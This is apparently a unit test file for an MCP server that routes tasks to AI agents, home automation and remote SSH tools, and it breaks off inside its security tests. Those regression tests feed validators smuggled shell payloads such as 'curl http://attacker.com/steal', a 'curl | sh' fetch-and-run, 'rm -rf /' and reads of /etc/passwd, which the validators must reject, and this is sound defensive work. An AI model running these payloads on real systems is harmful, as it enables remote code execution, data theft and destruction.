/**
 * Unit tests for elvatis-mcp pure functions.
 *
 * Run with: npm test
 *
 * Uses Node's built-in test runner (node:test) so no extra dependencies needed.
 * Tests only pure/deterministic logic (no SSH, no HTTP, no CLI spawning).
 */

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';

import { matchRules, ROUTING_RULES, KNOWN_AGENTS, ROUTING_GUIDE } from '../src/tools/routing-rules.js';
import { handlePromptSplit } from '../src/tools/splitter.js';
import { handleMcpHelp } from '../src/tools/help.js';
import {
  initRateLimiter, checkRateLimit, recordUsage, getAllQuotas, getCostSummary,
} from '../src/rate-limiter.js';
import { toRemoteSshCfg } from '../src/tools/remote-shell.js';
import { handleRemoteDocker } from '../src/tools/remote-docker.js';
import { handleRemoteService } from '../src/tools/remote-service.js';
import { handleOpenclawDeploy } from '../src/tools/openclaw-deploy.js';
import {
  validateContainerName,
  validateServiceName,
  validateAgentName,
  validateScheduleValue,
  validateCronId,
  validateChannel,
  validateDeployService,
  validateCronExpression,
  shellQuote,
} from '../src/validate.js';
import {
  handleCronCreate, handleCronDelete, handleCronHistory, buildCronCreateCommand,
} from '../src/tools/cron-manage.js';
import { buildMemorySearchCommand } from '../src/tools/memory.js';
import { buildLogsCommand } from '../src/tools/openclaw-logs.js';
import {
  buildListCommand, buildSizeCommand, buildReadCommand, buildWriteCommand,
} from '../src/tools/file-transfer.js';
import { handleOpenclawNotify } from '../src/tools/notify.js';
import { handleCronRun } from '../src/tools/cron.js';
import type { Config } from '../src/config.js';

// Minimal config stub for heuristic-only tests (no SSH/HTTP needed)
const stubConfig: Config = {
  sshHost: '',
  haUrl: '',
  haToken: '',
  localLlmEndpoint: 'http://localhost:1234/v1',
  localLlmModel: '',
  geminiModel: 'gemini-2.5-flash',
  remotePort: 22,
  remoteUser: 'root',
  remoteKeyPath: '~/.ssh/id_rsa',
};

// ============================================================================
// matchRules() — keyword routing engine
// ============================================================================

describe('matchRules', () => {
  it('routes coding keywords to codex_run', () => {
    const matches = matchRules('Fix the bug in the login function');
    assert.ok(matches.length > 0, 'should have at least one match');
    assert.equal(matches[0]!.tool, 'codex_run');
  });

  it('routes analysis keywords to gemini_run', () => {
    const matches = matchRules('Summarize this research paper');
    assert.ok(matches.length > 0);
    assert.equal(matches[0]!.tool, 'gemini_run');
  });

  it('routes classification to local_llm_run', () => {
    const matches = matchRules('Classify these items as positive or negative');
    assert.ok(matches.length > 0);
    assert.equal(matches[0]!.tool, 'local_llm_run');
  });

  it('routes trading keywords to openclaw_run', () => {
    const matches = matchRules('Check my portfolio performance');
    assert.ok(matches.length > 0);
    assert.equal(matches[0]!.tool, 'openclaw_run');
  });

  it('routes light control to home_light', () => {
    const matches = matchRules('Turn on the living room lights');
    assert.ok(matches.length > 0);
    assert.equal(matches[0]!.tool, 'home_light');
  });

  it('routes sensor queries to home_sensors', () => {
    const matches = matchRules('Read all sensor data');
    assert.ok(matches.length > 0);
    assert.equal(matches[0]!.tool, 'home_sensors');
  });

  it('routes climate control to home_climate', () => {
    const matches = matchRules('Set the thermostat to 22 degrees');
    assert.ok(matches.length > 0);
    assert.equal(matches[0]!.tool, 'home_climate');
  });

  it('routes vacuum commands to home_vacuum', () => {
    const matches = matchRules('Start the robot vacuum');
    assert.ok(matches.length > 0);
    assert.equal(matches[0]!.tool, 'home_vacuum');
  });

  it('routes memory search to openclaw_memory_search', () => {
    const matches = matchRules('Search my memory for meeting notes');
    assert.ok(matches.length > 0);
    assert.equal(matches[0]!.tool, 'openclaw_memory_search');
  });

  it('routes memory write to openclaw_memory_write', () => {
    const matches = matchRules('Remember this: the API key expires next week');
    assert.ok(matches.length > 0);
    assert.equal(matches[0]!.tool, 'openclaw_memory_write');
  });

  it('routes notifications to openclaw_notify', () => {
    const matches = matchRules('Send the results via WhatsApp');
    assert.ok(matches.length > 0);
    assert.equal(matches[0]!.tool, 'openclaw_notify');
  });

  it('uses word boundary matching (no partial matches)', () => {
    // "reviews" should NOT match "review" as a keyword for claude_run
    const matches = matchRules('Classify these customer reviews');
    // Should route to local_llm_run (classify keyword), not claude_run
    assert.ok(matches.length > 0);
    assert.notEqual(matches[0]!.tool, 'claude_run');
  });

  it('handles multi-word phrase matching', () => {
    const matches = matchRules('I need a short answer about this topic');
    const localMatch = matches.find(m => m.tool === 'local_llm_run');
    assert.ok(localMatch, 'should match local_llm_run via "short answer" phrase');
  });

  it('returns empty array for unrecognized input', () => {
    const matches = matchRules('xyzzy foobar blergh');
    assert.equal(matches.length, 0);
  });

  it('sorts matches by score descending', () => {
    const matches = matchRules('debug the TypeScript function bug and fix the compile error');
    assert.ok(matches.length > 0);
    for (let i = 1; i < matches.length; i++) {
      assert.ok(matches[i]!.score <= matches[i - 1]!.score, 'should be sorted by score desc');
    }
  });
});

// ============================================================================
// ROUTING_RULES / KNOWN_AGENTS / ROUTING_GUIDE — structural checks
// ============================================================================

describe('routing constants', () => {
  it('ROUTING_RULES has entries for all major tool categories', () => {
    const tools = new Set(ROUTING_RULES.map(r => r.tool));
    assert.ok(tools.has('codex_run'), 'should have codex_run');
    assert.ok(tools.has('gemini_run'), 'should have gemini_run');
    assert.ok(tools.has('claude_run'), 'should have claude_run');
    assert.ok(tools.has('openclaw_run'), 'should have openclaw_run');
    assert.ok(tools.has('local_llm_run'), 'should have local_llm_run');
    assert.ok(tools.has('home_light'), 'should have home_light');
    assert.ok(tools.has('home_sensors'), 'should have home_sensors');
    assert.ok(tools.has('home_climate'), 'should have home_climate');
  });

  it('every rule has non-empty keywords and reason', () => {
    for (const rule of ROUTING_RULES) {
      assert.ok(rule.keywords.length > 0, `${rule.tool} should have keywords`);
      assert.ok(rule.reason.length > 0, `${rule.tool} should have a reason`);
    }
  });

  it('KNOWN_AGENTS includes all routing rule tools', () => {
    for (const rule of ROUTING_RULES) {
      // Skip combined tool entries (tool1 / tool2 / tool3)
      if (rule.tool.includes(' / ')) continue;
      assert.ok(KNOWN_AGENTS.has(rule.tool), `KNOWN_AGENTS should include ${rule.tool}`);
    }
  });

  it('ROUTING_GUIDE mentions all sub-agent tools', () => {
    for (const tool of ['claude_run', 'codex_run', 'gemini_run', 'openclaw_run', 'local_llm_run']) {
      assert.ok(ROUTING_GUIDE.includes(tool), `guide should mention ${tool}`);
    }
  });
});

// ============================================================================
// handlePromptSplit (heuristic strategy) — splitting logic
// ============================================================================

describe('prompt_split heuristic', () => {
  it('single coding prompt returns 1 task with codex_run', async () => {
    const plan = await handlePromptSplit({
      prompt: 'Fix the authentication bug in the login handler',
      strategy: 'heuristic',
    }, stubConfig);

    assert.equal(plan.subtasks.length, 1);
    assert.equal(plan.subtasks[0]!.agent, 'codex_run');
    assert.equal(plan.parallelizable_groups.length, 1);
  });

  it('single analysis prompt returns 1 task with gemini_run', async () => {
    const plan = await handlePromptSplit({
      prompt: 'Summarize this 50-page research paper on quantum computing',
      strategy: 'heuristic',
    }, stubConfig);

    assert.equal(plan.subtasks.length, 1);
    assert.equal(plan.subtasks[0]!.agent, 'gemini_run');
  });

  it('splits "then" connector into sequential tasks', async () => {
    const plan = await handlePromptSplit({
      prompt: 'Refactor the auth module, then ask Gemini to review the changes',
      strategy: 'heuristic',
    }, stubConfig);

    assert.equal(plan.subtasks.length, 2);
    assert.equal(plan.subtasks[0]!.agent, 'codex_run');
    assert.equal(plan.subtasks[1]!.agent, 'gemini_run');
  });

  it('splits "also" connector into parallel tasks', async () => {
    const plan = await handlePromptSplit({
      prompt: 'Check my portfolio performance and also turn on the living room lights',
      strategy: 'heuristic',
    }, stubConfig);

    assert.equal(plan.subtasks.length, 2);
    const agents = plan.subtasks.map(t => t.agent);
    assert.ok(agents.includes('openclaw_run'));
    assert.ok(agents.includes('home_light'));
  });

  it('splits comma-separated clauses targeting different agents', async () => {
    const plan = await handlePromptSplit({
      prompt: 'Check the server status via OpenClaw, debug the failing test with Codex, have Claude review the fix, use the local model to format the report as markdown, and send the results via WhatsApp',
      strategy: 'heuristic',
    }, stubConfig);

    assert.equal(plan.subtasks.length, 5);
    const agents = plan.subtasks.map(t => t.agent);
    assert.ok(agents.includes('openclaw_run'), 'should have openclaw_run');
    assert.ok(agents.includes('codex_run'), 'should have codex_run');
    assert.ok(agents.includes('claude_run'), 'should have claude_run');
    assert.ok(agents.includes('local_llm_run'), 'should have local_llm_run');
    assert.ok(agents.includes('openclaw_notify'), 'should have openclaw_notify');
  });

  it('handles home automation chains with conditional logic', async () => {
    const plan = await handlePromptSplit({
      prompt: 'Read all sensor data, then if CO2 is above 1000ppm turn on the ventilation, dim the bedroom lights to 20%, and set the thermostat to 19 degrees',
      strategy: 'heuristic',
    }, stubConfig);

    assert.equal(plan.subtasks.length, 4);
    const agents = plan.subtasks.map(t => t.agent);
    assert.ok(agents.includes('home_sensors'), 'should have home_sensors');
    assert.ok(agents.includes('home_climate'), 'should have home_climate');
    // home_light should appear for the light dimming task
    assert.ok(agents.filter(a => a === 'home_light').length >= 1, 'should have home_light');
  });

  it('returns valid parallelizable_groups', async () => {
    const plan = await handlePromptSplit({
      prompt: 'Refactor the auth module, then check my portfolio and also turn on the lights',
      strategy: 'heuristic',
    }, stubConfig);

    assert.ok(plan.parallelizable_groups.length >= 1);
    // All task IDs should appear in exactly one group
    const allIds = plan.parallelizable_groups.flat();
    const taskIds = plan.subtasks.map(t => t.id);
    assert.deepEqual(new Set(allIds), new Set(taskIds));
  });

  it('populates model and estimated time', async () => {
    const plan = await handlePromptSplit({
      prompt: 'Fix the bug in the auth module',
      strategy: 'heuristic',
    }, stubConfig);

    assert.ok(plan.estimated_total_seconds > 0, 'should estimate time');
    assert.ok(plan.subtasks[0]!.model, 'should have a model suggestion');
    assert.ok(plan.strategy_used.includes('heuristic'), 'should report heuristic strategy');
  });

  it('includes note with execution instructions', async () => {
    const plan = await handlePromptSplit({
      prompt: 'Do two things: fix the bug and check the portfolio',
      strategy: 'heuristic',
    }, stubConfig);

    assert.ok(plan.note.length > 0, 'should include a note');
  });
});

// ============================================================================
// handleMcpHelp — routing guide and task recommendations
// ============================================================================

describe('mcp_help', () => {
  it('returns routing guide without task', async () => {
    const result = await handleMcpHelp({});
    assert.ok(result.guide.length > 0, 'should return guide');
    assert.ok(result.guide.includes('local_llm_run'), 'guide should mention local_llm_run');
    assert.ok(result.guide.includes('prompt_split'), 'guide should mention prompt_split');
  });

  it('routes coding task to codex_run', async () => {
    const result = await handleMcpHelp({ task: 'debug the TypeScript compile error and fix the bug' });
    assert.ok(result.recommendation, 'should have recommendation');
    assert.ok(result.recommendation!.includes('codex_run'), 'should recommend codex_run');
  });

  it('routes formatting task to local_llm_run', async () => {
    const result = await handleMcpHelp({ task: 'reformat this CSV data as a markdown table' });
    assert.ok(result.recommendation, 'should have recommendation');
    assert.ok(result.recommendation!.includes('local_llm_run'), 'should recommend local_llm_run');
  });

  it('routes home automation task to home tool', async () => {
    const result = await handleMcpHelp({ task: 'turn on the bedroom lights' });
    assert.ok(result.recommendation, 'should have recommendation');
    assert.ok(result.recommendation!.includes('home_light'), 'should recommend home_light');
  });

  it('routes trading task to openclaw_run', async () => {
    const result = await handleMcpHelp({ task: 'check my stock portfolio and current positions' });
    assert.ok(result.recommendation, 'should have recommendation');
    assert.ok(result.recommendation!.includes('openclaw_run'), 'should recommend openclaw_run');
  });
});

// ============================================================================
// Rate limiter — usage tracking and quota enforcement
// ============================================================================

describe('rate limiter', () => {
  // Use a temp dir that doesn't exist (no file I/O side effects)
  const tempDir = '/tmp/elvatis-mcp-test-' + Date.now();

  it('initializes without errors', () => {
    initRateLimiter({ dataDir: tempDir, limits: {} });
  });

  it('allows calls when under limit', () => {
    initRateLimiter({ dataDir: tempDir, limits: {} });
    const quota = checkRateLimit('gemini_run');
    assert.equal(quota.allowed, true);
    assert.equal(quota.usage.lastMinute, 0);
  });

  it('tracks usage after recordUsage', () => {
    initRateLimiter({ dataDir: tempDir, limits: {} });
    recordUsage('gemini_run');
    recordUsage('gemini_run');
    const quota = checkRateLimit('gemini_run');
    assert.equal(quota.usage.lastMinute, 2);
    assert.equal(quota.usage.lastHour, 2);
  });

  it('enforces per-minute rate limit', () => {
    initRateLimiter({ dataDir: tempDir, limits: { gemini_run: { perMinute: 2 } } });
    recordUsage('gemini_run');
    recordUsage('gemini_run');
    const quota = checkRateLimit('gemini_run');
    assert.equal(quota.allowed, false);
    assert.ok(quota.reason?.includes('minute'));
  });

  it('does not rate-limit local agents', () => {
    initRateLimiter({ dataDir: tempDir, limits: {} });
    const quota = checkRateLimit('local_llm_run');
    assert.equal(quota.allowed, true);
    assert.equal(quota.limits.perMinute, 0, 'no limits for local agents');
  });

  it('does not rate-limit home tools', () => {
    const quota = checkRateLimit('home_light');
    assert.equal(quota.allowed, true);
  });

  it('tracks costs per agent', () => {
    initRateLimiter({ dataDir: tempDir, limits: {} });
    recordUsage('claude_run');
    recordUsage('claude_run');
    const summary = getCostSummary();
    assert.ok(summary.total > 0, 'should have non-zero cost');
    assert.ok(summary.agents['claude_run']! > 0, 'should track claude_run cost');
  });

  it('getAllQuotas returns info for all cloud agents', () => {
    initRateLimiter({ dataDir: tempDir, limits: {} });
    const quotas = getAllQuotas();
    const agents = quotas.map(q => q.agent);
    assert.ok(agents.includes('claude_run'));
    assert.ok(agents.includes('codex_run'));
    assert.ok(agents.includes('gemini_run'));
  });

  it('respects custom limit overrides', () => {
    initRateLimiter({ dataDir: tempDir, limits: { codex_run: { perMinute: 1 } } });
    recordUsage('codex_run');
    const quota = checkRateLimit('codex_run');
    assert.equal(quota.allowed, false);
    assert.equal(quota.limits.perMinute, 1);
  });
});

// ============================================================================
// remote_shell — config helpers
// ============================================================================

describe('remote_shell', () => {
  it('toRemoteSshCfg throws when REMOTE_HOST is not set', () => {
    assert.throws(
      () => toRemoteSshCfg({ ...stubConfig, remoteHost: undefined }),
      /REMOTE_HOST is not configured/,
    );
  });

  it('toRemoteSshCfg returns correct SshConfig when REMOTE_HOST is set', () => {
    const cfg = toRemoteSshCfg({
      ...stubConfig,
      remoteHost: '10.0.0.1',
      remotePort: 2222,
      remoteUser: 'deploy',
      remoteKeyPath: '/home/deploy/.ssh/id_ed25519',
    });
    assert.equal(cfg.host, '10.0.0.1');
    assert.equal(cfg.port, 2222);
    assert.equal(cfg.username, 'deploy');
    assert.equal(cfg.keyPath, '/home/deploy/.ssh/id_ed25519');
  });

  it('toRemoteSshCfg uses default port 22 when not overridden', () => {
    const cfg = toRemoteSshCfg({ ...stubConfig, remoteHost: '10.0.0.2' });
    assert.equal(cfg.port, 22);
  });
});

// ============================================================================
// remote_docker — argument validation (no SSH needed)
// ============================================================================

describe('remote_docker', () => {
  const noHostConfig = { ...stubConfig, remoteHost: undefined };

  it('returns error when REMOTE_HOST is not configured', async () => {
    const result = await handleRemoteDocker({ action: 'list', lines: 50 }, noHostConfig);
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /REMOTE_HOST is not configured/);
  });

  it('returns error when container is missing for non-list action', async () => {
    const result = await handleRemoteDocker(
      { action: 'restart', lines: 50 },
      { ...stubConfig, remoteHost: '10.0.0.1' },
    );
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /container is required/);
  });

  it('returns error when command is missing for exec action', async () => {
    const result = await handleRemoteDocker(
      { action: 'exec', container: 'nginx', lines: 50 },
      { ...stubConfig, remoteHost: '10.0.0.1' },
    );
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /command is required/);
  });
});

// ============================================================================
// remote_service — argument validation (no SSH needed)
// ============================================================================

describe('remote_service', () => {
  const noHostConfig = { ...stubConfig, remoteHost: undefined };

  it('returns error when REMOTE_HOST is not configured', async () => {
    const result = await handleRemoteService({ action: 'list' }, noHostConfig);
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /REMOTE_HOST is not configured/);
  });

  it('returns error when service is missing for non-list action', async () => {
    const result = await handleRemoteService(
      { action: 'restart' },
      { ...stubConfig, remoteHost: '10.0.0.1' },
    );
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /service is required/);
  });

  it('action field is reflected in the response', async () => {
    const result = await handleRemoteService(
      { action: 'stop' },
      { ...stubConfig, remoteHost: '10.0.0.1' },
    );
    assert.equal(result.action, 'stop');
  });
});

// ============================================================================
// openclaw_deploy — argument validation (no SSH needed)
// ============================================================================

describe('openclaw_deploy', () => {
  it('reflects service and action in the response on SSH failure', async () => {
    const result = await handleOpenclawDeploy(
      { service: 'api', action: 'status' },
      { ...stubConfig, sshHost: '0.0.0.1' },
    );
    assert.equal(result.service, 'api');
    assert.equal(result.action, 'status');
    assert.equal(result.success, false);
  });

  it('uses default deploy script dir when OPENCLAW_DEPLOY_SCRIPT_DIR is not set', async () => {
    const result = await handleOpenclawDeploy(
      { service: 'worker', action: 'status' },
      { ...stubConfig, sshHost: '0.0.0.1', deployScriptDir: undefined },
    );
    assert.equal(result.success, false);
    assert.equal(result.service, 'worker');
  });
});

// ============================================================================
// Security regression tests — validate.ts (findings 1-8)
// All validators must reject shell metacharacters, leading hyphens, and "..".
// ============================================================================

describe('validateContainerName (security)', () => {
  // Valid inputs
  it('accepts a plain container name', () => {
    assert.equal(validateContainerName('nginx'), 'nginx');
  });
  it('accepts compose-style names with underscores and digits', () => {
    assert.equal(validateContainerName('project_web_1'), 'project_web_1');
  });
  it('accepts a 64-char hex container ID', () => {
    const id = 'a'.repeat(64);
    assert.equal(validateContainerName(id), id);
  });

  // Injection attempts that must be rejected
  it('rejects semicolon injection (finding 1)', () => {
    assert.throws(() => validateContainerName('myapp; rm -rf /'), /Invalid container name/);
  });
  it('rejects backtick injection', () => {
    assert.throws(() => validateContainerName('app`id`'), /Invalid container name/);
  });
  it('rejects dollar-sign subshell', () => {
    assert.throws(() => validateContainerName('app$(id)'), /Invalid container name/);
  });
  it('rejects leading hyphen (flag injection)', () => {
    assert.throws(() => validateContainerName('-v /:/host'), /Invalid container name/);
  });
  it('rejects path traversal via ".."', () => {
    // "../../etc/passwd" starts with "." so the leading-alphanumeric check fires first.
    // Either error message is acceptable; the key point is it throws.
    assert.throws(() => validateContainerName('../../etc/passwd'), /Invalid container name|must not contain/);
  });
  it('rejects newline injection', () => {
    assert.throws(() => validateContainerName('app\nrm -rf /'), /Invalid container name/);
  });
  it('rejects pipe injection (finding 2)', () => {
    assert.throws(() => validateContainerName('name | curl http://attacker.com/steal'), /Invalid container name/);
  });
  it('rejects empty string', () => {
    assert.throws(() => validateContainerName(''), /must not be empty/);
  });
});

describe('validateChannel (security)', () => {
  // The three names the zod description documents must keep working.
  it('accepts whatsapp', () => {
    assert.equal(validateChannel('whatsapp'), 'whatsapp');
  });
  it('accepts telegram', () => {
    assert.equal(validateChannel('telegram'), 'telegram');
  });
  it('accepts last', () => {
    assert.equal(validateChannel('last'), 'last');
  });
  it('accepts a future channel name with a dot, hyphen or underscore', () => {
    assert.equal(validateChannel('signal-v2.1_beta'), 'signal-v2.1_beta');
  });

  // The reported payload. `--channel` was pushed raw into a string that is
  // joined and handed to sshExec, so this ran on the remote host as the SSH user.
  it('rejects the reported semicolon payload', () => {
    assert.throws(() => validateChannel('whatsapp; curl http://x/y | sh'), /Invalid channel/);
  });
  it('rejects backtick substitution', () => {
    assert.throws(() => validateChannel('whatsapp`id`'), /Invalid channel/);
  });
  it('rejects dollar-sign subshell', () => {
    assert.throws(() => validateChannel('whatsapp$(id)'), /Invalid channel/);
  });
  it('rejects a pipe', () => {
    assert.throws(() => validateChannel('whatsapp | tee /tmp/x'), /Invalid channel/);
  });
  it('rejects newline-separated commands', () => {
    assert.throws(() => validateChannel('whatsapp\nid'), /Invalid channel/);
  });
  it('rejects a quote that would escape the surrounding quoting', () => {
    assert.throws(() => validateChannel("whatsapp'; id; '"), /Invalid channel/);
  });
  // A leading hyphen is flag injection rather than command injection: it would
  // be read by openclaw as another option instead of as a channel value.
  it('rejects a leading hyphen (flag injection)', () => {
    assert.throws(() => validateChannel('--announce'), /Invalid channel/);
  });
  it('rejects empty', () => {
    assert.throws(() => validateChannel(''), /must not be empty/);
  });
  it('rejects over-long input', () => {
    assert.throws(() => validateChannel('a'.repeat(65)), /too long/);
  });
});

describe('validateServiceName (security)', () => {
  it('accepts a plain service name', () => {
    assert.equal(validateServiceName('nginx'), 'nginx');
  });
  it('accepts service with at-sign instance specifier', () => {
    assert.equal(validateServiceName('getty@tty1.service'), 'getty@tty1.service');
  });
  it('rejects semicolon injection (finding 3)', () => {
    assert.throws(() => validateServiceName('myservice; cat /etc/passwd'), /Invalid service name/);
  });
  it('rejects leading hyphen', () => {
    assert.throws(() => validateServiceName('-n 1'), /Invalid service name/);
  });
  it('rejects space in name', () => {
    assert.throws(() => validateServiceName('nginx reload'), /Invalid service name/);
  });
  it('rejects empty string', () => {
    assert.throws(() => validateServiceName(''), /must not be empty/);
  });
});

describe('validateAgentName (security)', () => {
  it('accepts a short lowercase agent name', () => {
    assert.equal(validateAgentName('ops'), 'ops');
  });
  it('accepts alphanumeric with hyphen', () => {
    assert.equal(validateAgentName('trading-bot'), 'trading-bot');
  });
  it('rejects space (finding 6)', () => {
    assert.throws(() => validateAgentName('ops --local; id'), /Invalid agent name/);
  });
  it('rejects leading hyphen', () => {
    assert.throws(() => validateAgentName('--local'), /Invalid agent name/);
  });
  it('rejects semicolons', () => {
    assert.throws(() => validateAgentName('ops;id'), /Invalid agent name/);
  });
  it('rejects empty string', () => {
    assert.throws(() => validateAgentName(''), /must not be empty/);
  });
});

describe('validateScheduleValue (security)', () => {
  it('accepts a relative interval like "30m"', () => {
    assert.equal(validateScheduleValue('30m'), '30m');
  });
  it('accepts an ISO timestamp', () => {
    assert.equal(validateScheduleValue('2026-04-01T14:00:00'), '2026-04-01T14:00:00');
  });
  it('accepts a relative offset like "+20m"', () => {
    assert.equal(validateScheduleValue('+20m'), '+20m');
  });
  it('rejects semicolon injection (finding 7)', () => {
    assert.throws(() => validateScheduleValue('+1m; malicious'), /Invalid schedule value/);
  });
  it('rejects backtick injection', () => {
    assert.throws(() => validateScheduleValue('`id`'), /Invalid schedule value/);
  });
  it('rejects dollar-sign subshell', () => {
    assert.throws(() => validateScheduleValue('$(id)'), /Invalid schedule value/);
  });
  it('rejects empty string', () => {
    assert.throws(() => validateScheduleValue(''), /must not be empty/);
  });

  // Flag injection. The --every/--at value is the one token on the
  // `openclaw cron add` command line that the remote CLI parses as a bare
  // argument, so a value shaped like a flag is acted on as a flag. No shell
  // metacharacter is involved, which is why the metacharacter tests above all
  // passed while this class went through.
  it('rejects a bare leading hyphen', () => {
    assert.throws(() => validateScheduleValue('-rf'), /Invalid schedule value/);
  });
  it('rejects a long-form flag', () => {
    assert.throws(() => validateScheduleValue('--announce'), /Invalid schedule value/);
  });
  it('rejects a flag that collides with a real openclaw cron add option', () => {
    assert.throws(() => validateScheduleValue('--name'), /Invalid schedule value/);
  });
  it('rejects a hyphenated value that otherwise looks like an interval', () => {
    assert.throws(() => validateScheduleValue('-6h'), /Invalid schedule value/);
  });

  // Traversal. The docstring claimed this was rejected before it was.
  // Two different rules catch it depending on where the sequence sits, and the
  // tests assert the specific message so that neither rule can quietly stop
  // working behind the other one.
  it('rejects a traversal sequence inside an otherwise valid value', () => {
    assert.throws(() => validateScheduleValue('30m/../../etc'), /must not contain/);
  });
  it('rejects a value that begins with a traversal sequence', () => {
    // Caught by the leading-character rule, before the '..' check is reached.
    assert.throws(() => validateScheduleValue('../../etc/passwd'), /Invalid schedule value/);
  });
  it('rejects a bare traversal sequence', () => {
    assert.throws(() => validateScheduleValue('..'), /Invalid schedule value/);
  });

  // The other direction: the tightened rule must not refuse a legitimate
  // schedule. A validator that rejects everything passes every test above.
  it('still accepts a hyphen inside the value (ISO timestamp)', () => {
    assert.equal(validateScheduleValue('2026-04-01T14:00:00'), '2026-04-01T14:00:00');
  });
  it('still accepts a leading plus (relative offset)', () => {
    assert.equal(validateScheduleValue('+20m'), '+20m');
  });
  it('still accepts every documented interval form', () => {
    for (const v of ['30m', '6h', '1d']) {
      assert.equal(validateScheduleValue(v), v);
    }
  });
  it('still accepts a single dot, which is not traversal', () => {
    assert.equal(validateScheduleValue('1.5h'), '1.5h');
  });
});

describe('validateCronId (security)', () => {
  const validUuid = 'a1b2c3d4-e5f6-7890-abcd-ef1234567890';
  it('accepts a well-formed UUID', () => {
    assert.equal(validateCronId(validUuid), validUuid);
  });
  it('rejects a non-UUID string', () => {
    assert.throws(() => validateCronId('not-a-uuid'), /Invalid cron job ID/);
  });
  it('rejects a UUID with injection suffix', () => {
    assert.throws(() => validateCronId(validUuid + '; rm -rf /'), /Invalid cron job ID/);
  });
  it('rejects leading hyphen', () => {
    assert.throws(() => validateCronId('-f /etc/passwd'), /Invalid cron job ID/);
  });
  it('rejects empty string', () => {
    assert.throws(() => validateCronId(''), /must not be empty/);
  });
});

describe('shellQuote (security)', () => {
  it('wraps plain strings in single quotes', () => {
    assert.equal(shellQuote('nginx'), "'nginx'");
  });
  it('escapes embedded single quotes', () => {
    // Input: it's here  =>  Output: 'it'"'"'s here'
    assert.equal(shellQuote("it's here"), "'it'\\''s here'");
  });
  it('makes semicolons inert', () => {
    const q = shellQuote('a; rm -rf /');
    // The result must start and end with a single quote and not have unquoted semi
    assert.ok(q.startsWith("'"), 'must start with single quote');
    assert.ok(q.endsWith("'"), 'must end with single quote');
    // Shell would interpret this as one argument, no injection possible
    assert.ok(q.includes(';'), 'semicolon is inside quotes and inert');
  });
});

// ============================================================================
// Security regression: handleRemoteDocker rejects injection in container name
// ============================================================================

describe('handleRemoteDocker injection guard (security)', () => {
  const withHost = { ...stubConfig, remoteHost: '10.0.0.1' };

  it('rejects a container name with semicolon injection', async () => {
    const result = await handleRemoteDocker(
      { action: 'logs', container: 'myapp; rm -rf /', lines: 50 },
      withHost,
    );
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /Invalid container name/);
  });

  it('rejects a container name with leading hyphen', async () => {
    const result = await handleRemoteDocker(
      { action: 'start', container: '-v /:/host', lines: 50 },
      withHost,
    );
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /Invalid container name/);
  });
});

// ============================================================================
// Security regression: handleRemoteService rejects injection in service name
// ============================================================================

describe('handleRemoteService injection guard (security)', () => {
  const withHost = { ...stubConfig, remoteHost: '10.0.0.1' };

  it('rejects a service name with semicolon injection', async () => {
    const result = await handleRemoteService(
      { action: 'restart', service: 'myservice; cat /etc/passwd' },
      withHost,
    );
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /Invalid service name/);
  });

  it('rejects a service name with a space', async () => {
    const result = await handleRemoteService(
      { action: 'start', service: 'nginx reload' },
      withHost,
    );
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /Invalid service name/);
  });
});

// ============================================================================
// Security regression: handleCronCreate rejects schedule injection (finding 7)
// ============================================================================

describe('handleCronCreate schedule injection guard (security)', () => {
  const cronConfig: Config = {
    ...stubConfig,
    sshHost: '0.0.0.1',
    haUrl: 'http://localhost',
  };

  it('rejects a schedule with semicolon injection in --at value', async () => {
    const result = await handleCronCreate(
      { name: 'test', message: 'hello', schedule: 'at +1m; malicious' },
      cronConfig,
    );
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /Invalid schedule value/);
  });

  it('rejects a schedule with space/injection in --every value', async () => {
    const result = await handleCronCreate(
      { name: 'test', message: 'hello', schedule: 'every 30m; id' },
      cronConfig,
    );
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /Invalid schedule value/);
  });

  it('rejects a flag-shaped --every value (argument injection)', async () => {
    const result = await handleCronCreate(
      { name: 'test', message: 'hello', schedule: 'every --announce' },
      cronConfig,
    );
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /Invalid schedule value/);
  });

  it('rejects a flag-shaped --at value (argument injection)', async () => {
    const result = await handleCronCreate(
      { name: 'test', message: 'hello', schedule: 'at --name' },
      cronConfig,
    );
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /Invalid schedule value/);
  });

  it('rejects a traversal-shaped --every value', async () => {
    const result = await handleCronCreate(
      { name: 'test', message: 'hello', schedule: 'every 30m/../../etc' },
      cronConfig,
    );
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /must not contain/);
  });
});

// ============================================================================
// Security regression: handleCronDelete rejects non-UUID IDs (finding 7)
// ============================================================================

describe('handleCronDelete ID validation (security)', () => {
  const cronConfig: Config = {
    ...stubConfig,
    sshHost: '0.0.0.1',
    haUrl: 'http://localhost',
  };

  it('rejects a non-UUID job ID', async () => {
    const result = await handleCronDelete({ id: 'not-a-uuid; rm -rf /' }, cronConfig);
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /Invalid cron job ID/);
  });

  it('accepts a well-formed UUID (returns SSH error, not validation error)', async () => {
    const result = await handleCronDelete(
      { id: 'a1b2c3d4-e5f6-7890-abcd-ef1234567890' },
      cronConfig,
    );
    // SSH to 0.0.0.1 will fail; that is expected. The important thing is the
    // error is NOT about UUID validation.
    if (!result.success) {
      assert.ok(
        !(result.error ?? '').includes('Invalid cron job ID'),
        'error should be SSH-level, not UUID validation',
      );
    }
  });
});

// ============================================================================
// Security regression: validateDeployService (wave 3 finding 1)
// ============================================================================

describe('validateDeployService (security)', () => {
  // Valid inputs
  it('accepts a plain lowercase service name', () => {
    assert.equal(validateDeployService('api'), 'api');
  });
  it('accepts a name with hyphens and underscores', () => {
    assert.equal(validateDeployService('my-worker_v2'), 'my-worker_v2');
  });
  it('accepts an uppercase service name', () => {
    assert.equal(validateDeployService('Frontend'), 'Frontend');
  });

  // Injection attempts that must be rejected
  it('rejects semicolon injection (wave 3 finding 1)', () => {
    assert.throws(() => validateDeployService('api; rm -rf /'), /Invalid deploy service name/);
  });
  it('rejects backtick injection', () => {
    assert.throws(() => validateDeployService('api`id`'), /Invalid deploy service name/);
